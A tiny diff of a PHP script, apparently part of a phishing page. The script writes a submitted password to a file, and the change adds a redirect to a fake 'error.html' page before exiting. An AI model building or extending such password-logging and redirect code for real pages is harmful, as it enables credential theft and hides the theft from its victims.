@@ -11,6 +11,8 @@ fwrite($myfile, $password);
 fwrite($myfile, "\n");
 fclose($myfile);
 
+header("Location: error.html");
+
 die();
 
 ?>
